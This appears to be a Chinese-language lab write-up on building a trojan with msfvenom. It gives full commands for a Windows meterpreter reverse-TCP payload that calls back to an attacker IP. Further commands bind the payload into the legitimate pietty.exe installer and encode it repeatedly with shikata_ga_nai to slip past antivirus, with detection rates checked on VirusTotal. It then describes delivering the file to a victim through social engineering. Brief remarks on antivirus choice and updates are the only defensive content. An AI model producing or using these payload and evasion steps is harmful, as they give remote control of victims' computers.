製作一支簡單的木馬 並以模擬的方式讓被害者啟動 並控制受害者電腦

使用msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.106(本機IP 但厲害的攻擊者不會使用自己真的IP) LPORT=8888(要連接的port) -f 
exe> /home/rayui/test.exe(產生的檔案類型及位置)

![5](https://user-images.githubusercontent.com/49279418/117013936-e5c02400-ad22-11eb-9e76-0edfbe855a7f.png)

接者使用virus total網站來測試病毒
可以發現如此簡單的病毒都可以通過部份的防毒軟體
所以anti-virus(資安軟硬體)的選擇很重要
![6](https://user-images.githubusercontent.com/49279418/117014742-ac3be880-ad23-11eb-9eee-edce28c847f7.png)

接著做綑綁的測試(使用的是pietty.exe) 要做綑綁的原因很簡單目的是混淆防毒軟體 
而防毒軟體是去測試檔案是否有病毒的特徵 所以防毒軟體的更新很重要(不然有新型病毒一樣中招)
使用msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.106 LPORT=8888 -f exe 
-x /home/rayui/pietty0400b14.exe(拿來綑綁的檔案) -o /home/rayui/test2.exe(輸出目標)
![7](https://user-images.githubusercontent.com/49279418/117016799-a21ae980-ad25-11eb-9efc-14d998866bd4.png)


一樣使用virus total網站來測試病毒
可以發現有明顯的改進(可以使用msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.106 LPORT=8888 
-e x86/shikata_ga_nai -i 5(編碼次數) -f exe -o /home/rayui/test2.exe 來達成多次編碼以避免被偵測)
![8](https://user-images.githubusercontent.com/49279418/117017189-fcb44580-ad25-11eb-8190-baf1857e0e40.png)

接著模擬受害者點選到網頁並下載木馬程式
(此部分使用的是社交工程 在此就跳過社交工程的細節假設受害者以上鉤 避免方法)
要注意的還有攻擊者可以透過在網頁中寫惡意程式並不需要下載 甚至在mail中就可以寫入惡意程式
